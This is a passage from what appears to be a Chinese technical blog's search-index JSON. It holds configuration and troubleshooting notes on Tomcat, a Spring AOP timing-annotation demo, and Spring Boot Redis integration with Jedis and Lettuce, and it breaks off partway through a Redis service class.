添加完成后，效果如下：\n\n​     ![img](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/clip_image008.jpg)  \n\n \n\n7. 如有其他需求，可下载其他附件\n\n  ![img](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/clip_image009-163835031071812.png) \n\n \n\n如果需要独立的监控软件可下载：VisualVM\n\n下载地址：http://visualvm.github.io/download.html\n\n入门指南：https://visualvm.github.io/gettingstarted.html?VisualVM_1.3.9\n\n \n\n# Tomcat的连接数与线程池\n\n 参考： https://www.cnblogs.com/kismetv/p/7806063.html\n\n# Tomcat 配置文件server.xml\n\n参考： https://www.cnblogs.com/kismetv/p/7228274.html\n\n ","tags":["Tomcat"],"categories":["框架|中间件","Tomcat"]},{"title":"安装Tomcat服务","url":"/20250619/6f43f742.html","content":"\n\n\n# Window安装Tomcat 为服务\n\n```sh\ncd /tomcat/bin,\nservice.bat install\n```\n\n$CATALINA_HOME：为系统环境变量。查看方式\n\n```bash\nwindows： echo %CATALINA_HOME% \nlinux ：  echo $CATALINA_HOME\n```\n\n输入localhost:8080默认访问的是`$CATALINA_HOME/webapps/ROOT`\n\n\n\n","tags":["Tomcat"],"categories":["框架|中间件","Tomcat"]},{"title":"验证码图片无法显示","url":"/20250619/294d5c08.html","content":"\n# 问题描述\n\n服务器段错误信息：`java.lang.NoClassDefFoundError: Could not initialize class sun.awt.X11.XToolkit`\n\n# 定位原因\n\n对于一个Java服务器来说经常要处理一些图形元素，例如地图的创建或者图形和图表等。\n\n这些API基本上总是需要运行一个`X-server`以便能使用AWT（Abstract Window Toolkit，抽象窗口工具集）。\n\n# 问题处理\n\n在`Tomcat/bin/catalina.sh` 中增加 `-Djava.awt.headless=true`\n如下：`JAVA_OPTS=\"$JAVA_OPTS -Djava.awt.headless=true\"`\n\n![image-20211214011929661](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20211214011929661-1678153946602-1.png)      \n\n\n\n","tags":["日常记录","Tomcat"],"categories":["框架|中间件","Tomcat"]},{"title":"给Tomcat配置外部资源路径","url":"/20250619/673ec6c6.html","content":"\n# 背景说明\n\n对于一个web项目来说，除了文字之外，图片，视频等媒体元素也是其重要的组成部分。\n\n我们知道，web项目中如果用到大量的图片、视屏的资源，我们通常的做法是只在数据库中存储图片、视频等资源的路径，web项目直接通过路径来引用到对应的资源，而不是把整张图片以流的形式存储在数据库中，\n​\t\n\n当然对于系统中没用用到大量图片，或是对图片质量要求不是很高的一些小图标，我们也可以直接采用留的形式或者用base64编码以longtext的形式存储到数据库中。可以不必费时费力去配置这些资源的路径。\n\n但是他的弊端在于增加了数据库的压力，只适用于那种格局比较小，对数据库服务器性能没有太大要求的小项目中。\n\n\n\n给Tomcat配置外部资源路径的好处在于他大大减小了服务器以及数据库的压力，数据库中只需要存储资源的路径，把图片上传到Tomcat外的指定文件夹中，提供给\nTomcat中wabapps下的web项目引用。\n\n# 处理方法\n\n找到tomcat安装目录下conf/server.xml文件，在<Host>......</Host>标签内添加配置：\n\n```xml\n<!-- video image resources fload-->\n<Context docBase=\"C:\\resources\" reloadable=\"true\" debug=\"0\" path=\"/resources\"/>\n```\n\n- docBase是文件夹的物理路径\n- path是该文件夹的访问路径\n\n然后重启tomcat即可。假设在resources文件夹下存在一张名为test.jpg的图片，此时只需要`http://localhost:8080/resources/test.jsp`即可访问到该图片资源。\n\n\n\n","tags":["日常记录","Tomcat"],"categories":["框架|中间件","Tomcat"]},{"title":"在请求目标中找到无效字符","url":"/20250619/d035d83e.html","content":"\n# 问题描述\n\n错误信息：在请求目标中找到无效字符。有效字符在rfc 7230和rfc 3986中定义\n\n# 定位原因\n\n原因：请求地址中存在不支持的特殊符号\n\n# 解决方法\n\n解决： `relaxedPathChars=\"|{}[],%\" relaxedQueryChars=\"|{}[],%\"`\n\n```xml\n    <Connector port=\"80\" protocol=\"HTTP/1.1\"\n               connectionTimeout=\"20000\"relaxedPathChars=\"|{}[],%\" relaxedQueryChars=\"|{}[],%\"\n               redirectPort=\"8443\"  />\n```\n\n","tags":["日常记录","Tomcat"],"categories":["框架|中间件","Tomcat"]},{"title":"Tomcat异常排查记录","url":"/20250619/932ec968.html","content":"\n\n\n\n\n#  500 Internal Server Error\n\n原因1：是服务本身的问题（后台日志能查到原因）\n\n原因2：是Nginx服务器的原因。\n\n\n\n可参考原因： （未验证）\n\t\n\n1.上传的文件权限设置错误\n\t\n\n2.htaccess文件写入错误的代码\n\n\n\n## java.lang.NoSuchMethodException: org.apache.catalina.deploy.WebXml addFilter\n\n```\njava.lang.NoSuchMethodException: org.apache.catalina.deploy.WebXml addFilter\n  at org.apache.tomcat.util.IntrospectionUtils.callMethod1(IntrospectionUtils.java:855)\n  at org.apache.tomcat.util.digester.SetNextRule.end(SetNextRule.java:201)\n  at org.apache.tomcat.util.digester.Digester.endElement(Digester.java:1051)\n  at com.sun.org.apache.xerces.internal.parsers.AbstractSAXParser.endElement(AbstractSAXParser.java:601)\n  at com.sun.org.apache.xerces.internal.impl.XMLDocumentFragmentScannerImpl.scanEndElement(XMLDocumentFragmentScannerImpl.java:1774)\n  at com.sun.org.apache.xerces.internal.impl.XMLDocumentFragmentScannerImpl$FragmentContentDriver.next(XMLDocumentFragmentScannerImpl.java:2930)\n  at com.sun.org.apache.xerces.internal.impl.XMLDocumentScannerImpl.next(XMLDocumentScannerImpl.java:648)\n  at com.sun.org.apache.xerces.internal.impl.XMLDocumentFragmentScannerImpl.scanDocument(XMLDocumentFragmentScannerImpl.java:510)\n  at com.sun.org.apache.xerces.internal.parsers.XML11Configuration.parse(XML11Configuration.java:807)\n  at com.sun.org.apache.xerces.internal.parsers.XML11Configuration.parse(XML11Configuration.java:737)\n  at com.sun.org.apache.xerces.internal.parsers.XMLParser.parse(XMLParser.java:107)\n  at com.sun.org.apache.xerces.internal.parsers.AbstractSAXParser.parse(AbstractSAXParser.java:1205)\n  at com.sun.org.apache.xerces.internal.jaxp.SAXParserImpl$JAXPSAXParser.parse(SAXParserImpl.java:522)\n  at org.apache.tomcat.util.digester.Digester.parse(Digester.java:1537)\n  at org.apache.catalina.startup.ContextConfig.parseWebXml(ContextConfig.java:1825)\n  at org.apache.catalina.startup.ContextConfig.webConfig(ContextConfig.java:1201)\n  at org.apache.catalina.startup.ContextConfig.configureStart(ContextConfig.java:855)\n  at org.apache.catalina.startup.ContextConfig.lifecycleEvent(ContextConfig.java:345)\n  at org.apache.catalina.util.LifecycleSupport.fireLifecycleEvent(LifecycleSupport.java:119)\n  at org.apache.catalina.util.LifecycleBase.fireLifecycleEvent(LifecycleBase.java:90) \n...\n```\n\n解决方法为：在Tomacat7的`context.xml`文件里的`<Context>`中加上`<Loader delegate=\"true\" />`\n","tags":["日常记录","Tomcat"],"categories":["框架|中间件","Tomcat"]},{"title":"Spring基础-AOP","url":"/20250619/28678f43.html","content":"\n#  拦截器类型\n\n- @Before：这种拦截器先执行拦截代码，再执行目标代码。如果拦截器抛异常，那么目标代码就不执行了；\n- @After：这种拦截器先执行目标代码，再执行拦截器代码。无论目标代码是否抛异常，拦截器代码都会执行；\n- @AfterReturning：和@After不同的是，只有当目标代码正常返回时，才执行拦截器代码；\n- @AfterThrowing：和@After不同的是，只有当目标代码抛出了异常时，才执行拦截器代码；\n- @Around：能完全控制目标代码是否执行，并可以在**执行前后、抛异常后执行任意拦截代码**，可以说是包含了上面所有功能\n\n\n\n#  使用注解装配AOP的DEMO\n\n1. 依赖引入\n\n    ```xml\n    <dependency>\n        <groupId>org.aspectj</groupId>\n        <artifactId>aspectjweaver</artifactId>\n        <version>1.9.19</version>\n    </dependency>\n    ```\n\n    > spring-aop：AOP核心功能，例如代理工厂等\n    >\n    > aspectjweaver：支持切入点表达式等\n    >\n    > aspectjrt：支持aop相关注解等\n    >\n    > \n    >\n    > aspectjweaver包含aspectjrt的内容，所以我们只需要引入aspectjweaver依赖包就可以了 \n    >\n    > ![aspectjweaver包含aspectjrt的内容](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20230319183014032.png) \n\n\n\n2. 定义一个性能监控的注解\n\n    ```java\n    import java.lang.annotation.*;\n    \n    @Retention(RetentionPolicy.RUNTIME)\n    @Target(ElementType.METHOD)\n    @Inherited\n    public @interface MetricTime {\n        String value() default \"\";\n    }\n    ```\n\n3. 定义切面\n\n    ```java\n    import com.local.configuration.annotation.MetricTime;\n    import lombok.extern.slf4j.Slf4j;\n    import org.aspectj.lang.ProceedingJoinPoint;\n    import org.aspectj.lang.annotation.Around;\n    import org.aspectj.lang.annotation.Aspect;\n    import org.springframework.context.annotation.Configuration;\n    \n    import java.time.Duration;\n    import java.time.Instant;\n    \n    \n    @Slf4j\n    @Aspect\n    @Configuration\n    public class MetricAspect {\n        @Around(\"@annotation(metricTime)\")\n        public Object metric(ProceedingJoinPoint proceedingJoinPoint, MetricTime metricTime) throws Throwable {\n            System.out.println(\"Around.begin.............\");\n            Instant start = Instant.now();\n            try {\n                return proceedingJoinPoint.proceed();\n            } finally {\n                long spend = Duration.between(start, Instant.now()).toMillis();\n                System.out.printf(\"[Metrics][%s]-消耗：%d 毫秒\", metricTime.value(), spend);\n                System.out.println(\"Around.end.............\");\n            }\n        }\n    }\n    ```\n\n4. 在需要被监控的关键方法上标注该注解\n\n    ```java\n    \n    import com.local.configuration.annotation.MetricTime;\n    import org.springframework.stereotype.Controller;\n    import org.springframework.web.bind.annotation.GetMapping;\n    import org.springframework.web.bind.annotation.ResponseBody;\n    \n    import java.util.stream.Collectors;\n    import java.util.stream.IntStream;\n    \n    @Controller\n    public class ConfigController {\n    \n        @ResponseBody\n        @MetricTime(\"aop\")\n        @GetMapping(\"/aop/test\")\n        public Long testAopSpend() {\n            return IntStream.rangeClosed(1, 100).boxed().collect(Collectors.summingLong(e -> Long.valueOf(e)));\n        }\n    }\n    \n    ```\n\n\n5. 启动类上标注`@EnableAspectJAutoProxy`\n\n    ```java\n    @EnableAspectJAutoProxy\n    @SpringBootApplication\n    public class ConfigurationApplication {\n    \n        public static void main(String[] args) {\n            SpringApplication.run(ConfigurationApplication.class, args);\n        }\n    \n    }\n    ```\n\n\n\n#  AspectJ定义AOP装配规则\n\n| 装配规则                                                     | 说明                                                         |\n| ------------------------------------------------------------ | ------------------------------------------------------------ |\n| \"execution(public * com.itranswarp.learnjava.service.*.*(..))\" | 某个service包下面的所有Bean的所有方法都会被拦截              |\n| \"execution(public * update*(..))\"                            | 方法名前缀进行拦截。<br />这种非精准打击误伤面更大，因为从方法前缀区分是否是数据库操作是非常不可取的。 |\n|                                                              |                                                              |\n\n\n\n# AOP 可能造成的空指针\n\n参考：https://www.liaoxuefeng.com/wiki/1252599548343744/1339039378571298\n\n> Spring通过CGLIB创建的代理类，不会初始化代理类自身继承的任何成员变量，包括final类型的成员变量！","tags":["Spring Framework"],"categories":["Spring","Spring Framework"]},{"title":"Spring基础","url":"/20250619/d607e27b.html","content":"\n### Spring的特性和优势\n\n> Spring Framework有哪些特性，用了这个框架对开发而言有什么好处呢？\n\n从Spring 框架的**特性**来看：\n\n- 非侵入式：基于Spring开发的应用中的对象可以不依赖于Spring的API\n- 控制反转：`IOC——Inversion of Control`，指的是将对象的创建权交给 Spring 去创建。使用 Spring 之前，对象的创建都是由我们自己在代码中new创建。而使用 Spring 之后。对象的创建都是给了 Spring 框架。\n- 依赖注入：`DI——Dependency Injection`，是指依赖的对象不需要手动调用 setXX 方法去设置，而是通过配置赋值。\n- 面向切面编程：`Aspect Oriented Programming——AOP`\n- 容器：Spring 是一个容器，因为它包含并且管理应用对象的生命周期\n- 组件化：Spring 实现了使用简单的组件配置组合成一个复杂的应用。在 Spring 中可以使用XML和Java注解组合这些对象。\n- 一站式：在 IOC 和 AOP 的基础上可以整合各种企业应用的开源框架和优秀的第三方类库（实际上 Spring 自身也提供了表现层的 SpringMVC 和持久层的 Spring JDBC）\n\n从使用Spring 框架的**好处**看：\n\n- Spring 可以使开发人员使用 POJOs 开发企业级的应用程序。只使用 POJOs 的好处是你不需要一个 EJB 容器产品，比如一个应用程序服务器，但是你可以选择使用一个健壮的 servlet 容器，比如 Tomcat 或者一些商业产品。\n- Spring 在一个单元模式中是有组织的。即使包和类的数量非常大，你只要担心你需要的，而其它的就可以忽略了。\n- Spring 不会让你白费力气做重复工作，它真正的利用了一些现有的技术，像 ORM 框架、日志框架、JEE、Quartz 和 JDK 计时器，其他视图技术。\n- 测试一个用 Spring 编写的应用程序很容易，因为环境相关的代码被移动到这个框架中。此外，通过使用 JavaBean-style POJOs，它在使用依赖注入注入测试数据时变得更容易。\n- Spring 的 web 框架是一个设计良好的 web MVC 框架，它为比如 Structs 或者其他工程上的或者不怎么受欢迎的 web 框架提供了一个很好的供替代的选择。MVC 模式导致应用程序的不同方面(输入逻辑，业务逻辑和UI逻辑)分离，同时提供这些元素之间的松散耦合。模型(Model)封装了应用程序数据，通常它们将由 POJO 类组成。视图(View)负责渲染模型数据，一般来说它生成客户端浏览器可以解释 HTML 输出。控制器(Controller)负责处理用户请求并构建适当的模型，并将其传递给视图进行渲染。\n- Spring 对 JavaEE 开发中非常难用的一些 API（JDBC、JavaMail、远程调用等），都提供了封装，使这些API应用难度大大降低。\n- 轻量级的 IOC 容器往往是轻量级的，例如，特别是当与 EJB 容器相比的时候。这有利于在内存和 CPU 资源有限的计算机上开发和部署应用程序。\n- Spring 提供了一致的事务管理接口，可向下扩展到（使用一个单一的数据库，例如）本地事务并扩展到全局事务（例如，使用 JTA）\n\n","tags":["Spring Framework"],"categories":["Spring","Spring Framework"]},{"title":"配置 序列化成JSON字符串.md","url":"/20250619/3fb18050.html","content":"\n当我们使用`@Cacheable`注解的时候会将返回的对象缓存起来，我们会发现默认缓存的值是二进制的，不方便查看，为此我们自定义序列化配置，改成JSON格式的\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<project xmlns=\"http://maven.apache.org/POM/4.0.0\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n    xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd\">\n    <modelVersion>4.0.0</modelVersion>\n\n    <groupId>com.cjs.example</groupId>\n    <artifactId>cjs-springsecurity-example</artifactId>\n    <version>0.0.1-SNAPSHOT</version>\n    <packaging>jar</packaging>\n\n    <name>cjs-springsecurity-example</name>\n    <description></description>\n\n    <parent>\n        <groupId>org.springframework.boot</groupId>\n        <artifactId>spring-boot-starter-parent</artifactId>\n        <version>2.0.2.RELEASE</version>\n        <relativePath/> <!-- lookup parent from repository -->\n    </parent>\n\n\n    <dependencies>\n        <dependency>\n            <groupId>org.springframework.boot</groupId>\n            <artifactId>spring-boot-starter-cache</artifactId>\n        </dependency>\n        <dependency>\n            <groupId>org.springframework.boot</groupId>\n            <artifactId>spring-boot-starter-data-redis</artifactId>\n        </dependency>\n        \n        <dependency>\n            <groupId>org.springframework.boot</groupId>\n            <artifactId>spring-boot-starter-web</artifactId>\n        </dependency>\n\n        <dependency>\n            <groupId>org.projectlombok</groupId>\n            <artifactId>lombok</artifactId>\n            <optional>true</optional>\n        </dependency>\n        <dependency>\n            <groupId>org.springframework.boot</groupId>\n            <artifactId>spring-boot-starter-test</artifactId>\n            <scope>test</scope>\n        </dependency>\n        <dependency>\n            <groupId>org.springframework.security</groupId>\n            <artifactId>spring-security-test</artifactId>\n            <scope>test</scope>\n        </dependency>\n    </dependencies>\n\n    <build>\n        <plugins>\n            <plugin>\n                <groupId>org.springframework.boot</groupId>\n                <artifactId>spring-boot-maven-plugin</artifactId>\n            </plugin>\n        </plugins>\n    </build>\n\n</project>\n```\n\n```java\n@Bean\npublic RedisCacheManager redisCacheManager(RedisTemplate redisTemplate) {\n    RedisCacheWriter redisCacheWriter = RedisCacheWriter.nonLockingRedisCacheWriter(\n            redisTemplate.getConnectionFactory());\n    RedisCacheConfiguration redisCacheConfiguration = RedisCacheConfiguration.defaultCacheConfig()\n            .serializeValuesWith(\n                    RedisSerializationContext.SerializationPair.fromSerializer(redisTemplate.getValueSerializer()));\n    return new RedisCacheManager(redisCacheWriter, redisCacheConfiguration);\n}\n```\n\n","tags":["Redis","Spring Cache"],"categories":["数据库","Spring","Redis","Spring Cache"]},{"title":"SpringBoot集成Redis","url":"/20250619/f677ab49.html","content":"\n\n\n> Spring 通过模板方式（RedisTemplate）提供了对Redis的数据查询和操作功能。\n>\n> 可以参考 https://repo1.maven.org/maven2/org/springframework/boot/spring-boot-dependencies/2.6.6/spring-boot-dependencies-2.6.6.pom 查看版本依赖\n\n# 基于RedisTemplate+Jedis的数据操作\n\n> Jedis是Redis的Java客户端，在SpringBoot 1.x版本中也是默认的客户端。在SpringBoot 2.x版本中默认客户端是Luttuce。\n\n## 实现DEMO\n\n1. POM.xml\n\n    引入spring-boot-starter-data-redis包，SpringBoot2中默认的客户端是Lettuce, 所以需要exclude掉lettuce-core包，并引入jedis的包。\n\n    ```xml\n    <dependencies>\n        <dependency>\n            <groupId>org.springframework.boot</groupId>\n            <artifactId>spring-boot-starter</artifactId>\n            <version>2.6.6</version>\n        </dependency>\n        <dependency>\n            <groupId>com.alibaba.cloud</groupId>\n            <artifactId>spring-cloud-starter-alibaba-nacos-config</artifactId>\n        </dependency>\n        <dependency>\n            <groupId>org.springframework.boot</groupId>\n            <artifactId>spring-boot-starter-data-redis</artifactId>\n            <version>2.6.6</version>\n            <exclusions>\n                <exclusion>\n                    <groupId>io.lettuce</groupId>\n                    <artifactId>lettuce-core</artifactId>\n                </exclusion>\n            </exclusions>\n        </dependency>\n        <dependency>\n            <groupId>redis.clients</groupId>\n            <artifactId>jedis</artifactId>\n            <version>3.7.1</version>\n        </dependency>\n        <dependency>\n            <groupId>org.apache.commons</groupId>\n            <artifactId>commons-pool2</artifactId>\n            <version>2.11.1</version>\n        </dependency>\n    </dependencies>\n    ```\n\n    \n\n2. redis.yml 配置\n\n    ```yml\n    spring: \n      redis:\n        database: 0\n        host: 172.16.163.128\n        password: dHcphufFGcSaJLMK\n        port: 6380\n        timeout: 10000\n        jedis:\n          pool:\n            min-idle: 0\n            max-active: 8\n            max-idle: 8\n    \n    ```\n\n3. RedisConfig配置\n\n    ```java\n    import org.springframework.context.annotation.Bean;\n    import org.springframework.context.annotation.Configuration;\n    import org.springframework.data.redis.connection.RedisConnectionFactory;\n    import org.springframework.data.redis.core.RedisTemplate;\n    import org.springframework.data.redis.serializer.GenericJackson2JsonRedisSerializer;\n    import org.springframework.data.redis.serializer.StringRedisSerializer;\n    \n    @Configuration\n    public class RedisConfig {\n    \n        @Bean\n        public RedisTemplate<String, Object> redisTemplate(RedisConnectionFactory connectionFactory) {\n            RedisTemplate<String, Object> template = new RedisTemplate<>();\n            template.setConnectionFactory(connectionFactory);\n            template.setKeySerializer(new StringRedisSerializer());\n            template.setHashKeySerializer(new StringRedisSerializer());\n            template.setValueSerializer(new GenericJackson2JsonRedisSerializer());\n            template.setHashValueSerializer(new GenericJackson2JsonRedisSerializer());\n            template.afterPropertiesSet();\n            return template;\n        }\n    }\n    ```\n\n    注入JedisConnectionFactory：\n\n    ![注入JedisConnectionFactory](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20230315153558460.png) \n\n1. \n\n4. 测试Redis连接\n\n    ```xml\n    <dependencies>\n        <dependency>\n            <groupId>org.projectlombok</groupId>\n            <artifactId>lombok</artifactId>\n            <version>${lombok.version}</version>\n            <optional>true</optional>\n        </dependency>\n        <dependency>\n            <groupId>org.springframework.boot</groupId>\n            <artifactId>spring-boot-starter-test</artifactId>\n            <version>${springboot.version}</version>\n            <scope>test</scope>\n        </dependency>\n        <dependency>\n            <groupId>junit</groupId>\n            <artifactId>junit</artifactId>\n            <version>${junit.version}</version>\n            <scope>test</scope>\n        </dependency>\n    </dependencies>\n    ```\n\n    ```java\n    import org.junit.Assert;\n    import org.junit.Test;\n    import org.junit.runner.RunWith;\n    import org.springframework.boot.test.context.SpringBootTest;\n    import org.springframework.data.redis.core.RedisTemplate;\n    import org.springframework.test.context.ActiveProfiles;\n    import org.springframework.test.context.TestPropertySource;\n    import org.springframework.test.context.junit4.SpringRunner;\n    \n    import javax.annotation.Resource;\n    \n    @RunWith(SpringRunner.class)\n    @SpringBootTest(classes = DatabaseApplication.class)\n    @ActiveProfiles(\"dev\")\n    @TestPropertySource(\n            properties = {\n                    \"server.port=80\",\n                    \"spring.application.name=configuration\",\n                    \"spring.cloud.nacos.config.server-addr=native.virtual.com:8848\",\n                    \"spring.cloud.nacos.config.file-extension=yml\",\n                    \"spring.cloud.nacos.config.namespace=learn-dev\",\n                    \"spring.cloud.nacos.config.group=DEFAULT_GROUP\",\n                    \"spring.cloud.nacos.config.extension-configs[0].data-id=redis.yml\",\n                    \"spring.cloud.nacos.config.extension-configs[0].refresh=true\"\n            }\n    )\n    public class DatabaseApplicationTests {\n        @Resource\n        private RedisTemplate redisTemplate;\n    \n        @Test\n        public void testRedisConnection() {\n            redisTemplate.opsForList().leftPush(\"test\", \"111\");\n            redisTemplate.opsForList().leftPush(\"test\", \"222\");\n            redisTemplate.opsForList().leftPush(\"test\", \"333\");\n            Assert.assertTrue(\"111\".equals(redisTemplate.opsForList().rightPop(\"test\")));\n            Assert.assertTrue(redisTemplate.delete(\"test\"));\n        }\n    }\n    ```\n\n    \n\n# 基于RedisTemplate+Lettuce的数据操作\n\n## Lettuce 说明\n\n[Github（lettuce-core）](https://github.com/lettuce-io/lettuce-core)\n\n\n\nLettuce 是一个可伸缩线程安全的 Redis 客户端。多个线程可以共享同一个 RedisConnection。它利用优秀 netty NIO 框架来高效地管理多个连接。\n\nLettuce 从一开始就按照非阻塞式 IO 进行设计，是一个纯异步客户端，对异步和反应式 API 的支持都很全面。即使是同步命令，底层的通信过程仍然是异步模型，只是通过阻塞调用线程来模拟出同步效果而已。\n\n> 在SpringBoot 2.x版本中Redis默认客户端是Lettuce，本文主要介绍SpringBoot 和默认的Lettuce的整合案例\n\n## Lettuce 特性\n\n- 支持 同步、异步、响应式 的方式\n- 支持 Redis Sentinel\n- 支持 Redis Cluster\n- 支持 SSL 和 Unix Domain Socket 连接\n- 支持 Streaming API\n- 支持 CDI 和 Spring 的集成\n- 支持 Command Interfaces\n- 兼容 Java 8+ 以上版本\n\n[Lettuce  和 Jedis 对比官方说明](https://docs.spring.io/spring-data/redis/docs/current/reference/html/#redis:connectors:lettuce )\n\n![image-20230315150902635](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20230315150902635.png) \n\n## 实现DEMO\n\n\n\n1. POM.xml\n\n    引入spring-boot-starter-data-redis包，SpringBoot2中默认的客户端是Lettuce, 所以需要exclude掉lettuce-core包，并引入jedis的包。\n\n    ```xml\n    <dependencies>\n        <dependency>\n            <groupId>org.springframework.boot</groupId>\n            <artifactId>spring-boot-starter</artifactId>\n            <version>2.6.6</version>\n        </dependency>\n        <dependency>\n            <groupId>com.alibaba.cloud</groupId>\n            <artifactId>spring-cloud-starter-alibaba-nacos-config</artifactId>\n        </dependency>\n        <dependency>\n            <groupId>org.springframework.boot</groupId>\n            <artifactId>spring-boot-starter-data-redis</artifactId>\n            <version>2.6.6</version>\n        </dependency>\n        <dependency>\n            <groupId>org.apache.commons</groupId>\n            <artifactId>commons-pool2</artifactId>\n            <version>2.11.1</version>\n        </dependency>\n    </dependencies>\n    ```\n\n    \n\n2. redis.yml 配置\n\n    ```yml\n    spring: \n      redis:\n        database: 0\n        host: 172.16.163.128\n        password: dHcphufFGcSaJLMK\n        port: 6380\n        timeout: 10000\n        lettuce:\n          pool:\n            max-active: 200\n            max-idle: 5\n            max-wait: -1\n            min-idle: 0\n            enabled: true\n    ```\n\n3. RedisConfig配置（代码和Jedis注入一样 ，只是装配的 `connectionFactory`  实现类不一样 ）\n\n    ```java\n    import org.springframework.context.annotation.Bean;\n    import org.springframework.context.annotation.Configuration;\n    import org.springframework.data.redis.connection.RedisConnectionFactory;\n    import org.springframework.data.redis.core.RedisTemplate;\n    import org.springframework.data.redis.serializer.GenericJackson2JsonRedisSerializer;\n    import org.springframework.data.redis.serializer.StringRedisSerializer;\n    \n    @Configuration\n    public class RedisConfig {\n    \n        @Bean\n        public RedisTemplate<String, Object> redisTemplate(RedisConnectionFactory connectionFactory) {\n            RedisTemplate<String, Object> template = new RedisTemplate<>();\n            template.setConnectionFactory(connectionFactory);\n            template.setKeySerializer(new StringRedisSerializer());\n            template.setHashKeySerializer(new StringRedisSerializer());\n            template.setValueSerializer(new GenericJackson2JsonRedisSerializer());\n            template.setHashValueSerializer(new GenericJackson2JsonRedisSerializer());\n            template.afterPropertiesSet();\n            return template;\n        }\n    }\n    ```\n\n    注入JedisConnectionFactory：\n\n    ![注入LettuceConnectionFactory](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20230315154313840.png) \n\n    \n\n4. 测试Redis连接\n\n    ```xml\n    <dependencies>\n        <dependency>\n            <groupId>org.projectlombok</groupId>\n            <artifactId>lombok</artifactId>\n            <version>${lombok.version}</version>\n            <optional>true</optional>\n        </dependency>\n        <dependency>\n            <groupId>org.springframework.boot</groupId>\n            <artifactId>spring-boot-starter-test</artifactId>\n            <version>${springboot.version}</version>\n            <scope>test</scope>\n        </dependency>\n        <dependency>\n            <groupId>junit</groupId>\n            <artifactId>junit</artifactId>\n            <version>${junit.version}</version>\n            <scope>test</scope>\n        </dependency>\n    </dependencies>\n    ```\n\n    ```java\n    import org.junit.Assert;\n    import org.junit.Test;\n    import org.junit.runner.RunWith;\n    import org.springframework.boot.test.context.SpringBootTest;\n    import org.springframework.data.redis.core.RedisTemplate;\n    import org.springframework.test.context.ActiveProfiles;\n    import org.springframework.test.context.TestPropertySource;\n    import org.springframework.test.context.junit4.SpringRunner;\n    \n    import javax.annotation.Resource;\n    \n    @RunWith(SpringRunner.class)\n    @SpringBootTest(classes = DatabaseApplication.class)\n    @ActiveProfiles(\"dev\")\n    @TestPropertySource(\n            properties = {\n                    \"server.port=80\",\n                    \"spring.application.name=configuration\",\n                    \"spring.cloud.nacos.config.server-addr=native.virtual.com:8848\",\n                    \"spring.cloud.nacos.config.file-extension=yml\",\n                    \"spring.cloud.nacos.config.namespace=learn-dev\",\n                    \"spring.cloud.nacos.config.group=DEFAULT_GROUP\",\n                    \"spring.cloud.nacos.config.extension-configs[0].data-id=redis.yml\",\n                    \"spring.cloud.nacos.config.extension-configs[0].refresh=true\"\n            }\n    )\n    public class DatabaseApplicationTests {\n        @Resource\n        private RedisTemplate redisTemplate;\n    \n        @Test\n        public void testRedisConnection() {\n            redisTemplate.opsForList().leftPush(\"test\", \"111\");\n            redisTemplate.opsForList().leftPush(\"test\", \"222\");\n            redisTemplate.opsForList().leftPush(\"test\", \"333\");\n            Assert.assertTrue(\"111\".equals(redisTemplate.opsForList().rightPop(\"test\")));\n            Assert.assertTrue(redisTemplate.delete(\"test\"));\n        }\n    }\n    ```\n\n    \n\n## 基于RedisTemplate+Lettuce数据类封装\n\n原文：https://pdai.tech/md/spring/springboot/springboot-x-redis-lettuce-wrap.html\n\n> RedisTemplate中的操作和方法众多，为了程序保持方法使用的一致性，屏蔽一些无关的方法以及对使用的方法进一步封装。\n\n1. RedisService接口类\n\n    ```java\n    import org.springframework.data.redis.core.RedisCallback;\n    \n    import java.util.Collection;\n    import java.util.Set;\n    \n    public interface IRedisService<T> {\n    \n        void set(String key, T value);\n    \n        void set(String key, T value, long time);\n    \n        T get(String key);\n    \n        void delete(String key);\n    \n        void delete(Collection<String> keys);\n    \n        boolean expire(String key, long time);\n    \n        Long getExpire(String key);\n    \n        boolean hasKey(String key);\n    \n        Long increment(String key, long delta);\n    \n        Long decrement(String key, long delta);\n    \n        void addSet(String key, T value);\n    \n        Set<T> getSet(String key);\n    \n        void deleteSet(String key, T value);\n    \n        T execute(RedisCallback<T> redisCallback);\n    }\n    ```\n\n2. RedisService的实现类\n\n    ```xml\n    import com.local.service.IRedisService;\n    import org.springframework.data.redis.core.RedisCallback;\n    import org.springframework.data.redis.core.RedisTemplate;\n    \n    import javax.annotation.Resource;\n    import java.util.Collection;\n    import java.util.Set;\n    import java.util.concurrent.TimeUnit;\n    \n    public class RedisServiceImpl<T> implements IRedisService<T> {\n    \n        @Resource(name = \"redisTemplate\")\n        private RedisTemplate<String, T> redisTemplate;\n    \n        @Override\n        public void set(String key, T value, long time) {\n            redisTemplate.opsForValue().set(key, value, time, TimeUnit.SECONDS);\n        }\n    \n        @Override\n        public void set(String key, T value) {\n            redisTemplate.opsForValue().set(key, value);\n        }\n    \n        @Override\n        public T get(String key) {\n            return redisTemplate.opsForValue().get(key);\n        }\n    \n        @Override\n        public void delete(String key) {\n            redisTemplate.delete(key);\n        }\n    \n        @Override\n        public void delete(Collection<String> keys) {\n            redisTemplate.delete(keys);\n        }\n    \n        @Override\n        public boolean expire(String key, long time) {\n            return redisTemplate.expire(key, time, TimeUnit.SECONDS);\n        }\n    \n        @Override\n        public Long getExpire(String key) {\n            return redisTemplate.getExpire(key, TimeUnit.SECONDS);\n        }\n    \n        @Override\n        public boolean hasKey(String key) {\n            return redisTemplate.hasKey(key);\n        }\n    \n        @Override\n        public Long increment(String key, long delta) {\n            return redisTemplate.opsForValue().increment(key, delta);\n        }\n    \n        @Override\n        public Long decrement(String key, long delta) {\n            return redisTemplate.opsForValue().decrement(key);\n        }\n    \n        @Override\n        public void addSet(String key, T value) {\n            redisTemplate.opsForSet().add(key, value);\n        }\n    \n        @Override\n        public Set<T> getSet(String key) {\n            return redisTemplate.opsForSet().members(key);\n        }\n    \n        @Override\n        public void deleteSet(String key, T value) {\n            redisTemplate.opsForSet().remove(key, value);\n        }\n    \n        @Override\n        public T 